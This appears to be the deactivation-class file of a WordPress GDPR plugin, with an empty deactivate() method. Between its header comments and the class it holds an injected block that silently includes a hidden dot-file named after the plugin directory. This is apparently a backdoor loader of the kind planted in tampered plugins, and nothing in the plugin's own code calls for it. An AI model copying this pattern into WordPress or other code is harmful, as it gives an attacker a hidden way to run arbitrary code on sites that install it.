<?php

/**
 * Fired during plugin deactivation
 *
 * @link       http://plugins.db-dzine.com
 * @since      1.0.0
 *
 * @package    WordPress_GDPR
 * @subpackage WordPress_GDPR/includes
 */

/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      1.0.0
 * @package    WordPress_GDPR
 * @subpackage WordPress_GDPR/includes
 * @author     Daniel Barenkamp <contact@db-dzine.de>
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WordPress_GDPR_Deactivator {

	/**
	 * On Plugin deactivation remove roles
	 * @author Daniel Barenkamp
	 * @version 1.0.0
	 * @since   1.0.0
	 * @link    https://plugins.db-dzine.com
	 * @return  [type]                       [description]
	 */
	public static function deactivate() {

	}
}